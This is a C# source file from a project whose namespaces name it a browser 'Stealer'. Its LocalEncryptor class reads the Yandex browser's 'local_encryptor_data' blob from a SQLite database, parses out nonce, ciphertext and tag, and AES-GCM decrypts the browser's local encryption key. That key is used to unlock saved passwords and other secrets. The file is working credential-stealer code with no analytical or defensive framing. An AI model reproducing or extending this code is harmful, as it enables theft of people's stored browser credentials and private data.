using System;
using System.Text;

using YandexDecryptor.Helpers;
using YandexDecryptor.Stealer.Browsers.Chromium;

namespace YandexDecryptor.Stealer.Browsers.Yandex
{
    internal sealed class LocalEncryptor
    {
        public static byte[] ExtractEncryptionKey(string dbName, byte[] encryptionKey)
        {
            SQLiteHandler sql = new SQLiteHandler(dbName);
            byte[] localEncryptor = new byte[] { };
            if (sql.ReadTable("meta"))
            {
                for (int r = 0; r < sql.GetRowCount(); r++)
                {
                    if (sql.GetValue(r, "key").Equals("local_encryptor_data"))
                    {
                        localEncryptor = sql.GetBytes(r, "value");
                        break;
                    }
                }
            }

            int index = IOUtils.FindByteSequence(localEncryptor, Encoding.ASCII.GetBytes("v10"));

            if (index == -1)
            {
                return null;
            }

            // Extract encrypted_key_blob
            byte[] encrypted_key_blob = new byte[96];
            Array.Copy(localEncryptor, index + 3, encrypted_key_blob, 0, 96);

            // Extract IV
            byte[] nonce = new byte[12];
            Array.Copy(encrypted_key_blob, 0, nonce, 0, 12);

            // Extract ciphertext
            int ciphertextLength = encrypted_key_blob.Length - 12 - 16;
            byte[] ciphertext = new byte[ciphertextLength];
            Array.Copy(encrypted_key_blob, 12, ciphertext, 0, ciphertextLength);

            // Extract tag
            byte[] tag = new byte[16];
            Array.Copy(encrypted_key_blob, encrypted_key_blob.Length - 16, tag, 0, 16);

            // Decrypt key
            byte[] decryptedData = AesGcm.Decrypt(encryptionKey, nonce, null, ciphertext, tag);

            // Verify key
            if (BitConverter.ToInt32(decryptedData, 0) == 0x20120108)
            {
                byte[] decryptedKey = new byte[32];
                Array.Copy(decryptedData, 4, decryptedKey, 0, 32);
                return decryptedKey;
            }

            return null;
        }

    }
}
